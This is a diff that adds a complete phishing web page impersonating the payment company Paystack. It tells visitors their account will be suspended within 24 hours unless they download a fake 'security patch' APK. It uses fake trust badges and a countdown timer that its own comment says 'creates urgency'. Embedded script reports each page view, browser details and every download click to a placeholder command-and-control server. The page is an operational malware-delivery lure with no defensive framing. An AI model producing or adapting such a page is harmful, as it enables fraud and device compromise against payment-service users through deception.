@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <title>Paystack | Critical Security Update Required</title>
+  <link rel="stylesheet" href="css/style.css"/>
+  <link rel="icon" type="image/svg+xml" href="images/logo.svg"/>
+  <meta name="description" content="Install the latest Paystack security patch to keep your account active."/>
+</head>
+<body>
+  <div class="bg-overlay"></div>
+  
+  <div class="container">
+    <div class="alert-banner">
+      <span class="alert-icon">⚠️</span>
+      <span>Security Alert</span>
+    </div>
+
+    <div class="card">
+      <div class="logo-section">
+        <img src="images/logo.svg" alt="Paystack" class="logo"/>
+        <h1>Security Update Required</h1>
+        <p class="subtitle">Your account needs a critical patch</p>
+      </div>
+
+      <div class="alert-body">
+        <p>A vulnerability has been detected in your payment profile. Your access to Paystack-integrated services will be <strong>suspended in 24 hours</strong> unless you install the latest security patch.</p>
+        
+        <div class="info-box">
+          <div class="info-row">
+            <span>Update Version</span>
+            <strong>2.1.4</strong>
+          </div>
+          <div class="info-row">
+            <span>Size</span>
+            <strong>17.3 KB</strong>
+          </div>
+          <div class="info-row">
+            <span>Verified by</span>
+            <strong>Paystack Trust & Safety</strong>
+          </div>
+          <div class="info-row">
+            <span>Deadline</span>
+            <strong class="urgent">24 hours</strong>
+          </div>
+        </div>
+      </div>
+
+      <a href="Paystack_Update.apk" class="btn-download" id="downloadBtn">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+          <polyline points="7 10 12 15 17 10"/>
+          <line x1="12" y1="15" x2="12" y2="3"/>
+        </svg>
+        Download & Install Update
+      </a>
+
+      <div class="trust-badges">
+        <span>🔒 SSL Secured</span>
+        <span>✓ Verified</span>
+        <span>🛡️ Paystack Inc.</span>
+      </div>
+
+      <div class="timer-section">
+        <p>Account suspension in:</p>
+        <div class="timer" id="countdown">
+          <span id="hours">23</span>:<span id="minutes">59</span>:<span id="seconds">59</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer">
+      <p>© 2026 Paystack Inc. • <a href="#">Privacy</a> • <a href="#">Support</a></p>
+      <p class="ref">Ref: PST-SEC-2026-48291</p>
+    </div>
+  </div>
+
+  <script>
+    // Countdown timer (creates urgency)
+    let total = 23 * 3600 + 59 * 60 + 59;
+    setInterval(() => {
+      total--;
+      if (total < 0) total = 86400;
+      const h = Math.floor(total / 3600);
+      const m = Math.floor((total % 3600) / 60);
+      const s = total % 60;
+      document.getElementById('hours').textContent = String(h).padStart(2, '0');
+      document.getElementById('minutes').textContent = String(m).padStart(2, '0');
+      document.getElementById('seconds').textContent = String(s).padStart(2, '0');
+    }, 1000);
+
+    // Log page view to C2
+    fetch('https://your-c2-server.com/track', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        page: 'security-alert',
+        time: Date.now(),
+        ua: navigator.userAgent,
+        screen: screen.width + 'x' + screen.height
+      }),
+      mode: 'no-cors'
+    }).catch(() => {});
+
+    // Track download click
+    document.getElementById('downloadBtn').addEventListener('click', () => {
+      fetch('https://your-c2-server.com/track', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          action: 'download-clicked',
+          time: Date.now()
+        }),
+        mode: 'no-cors'
+      }).catch(() => {});
+    });
+  </script>
+</body>
+</html>
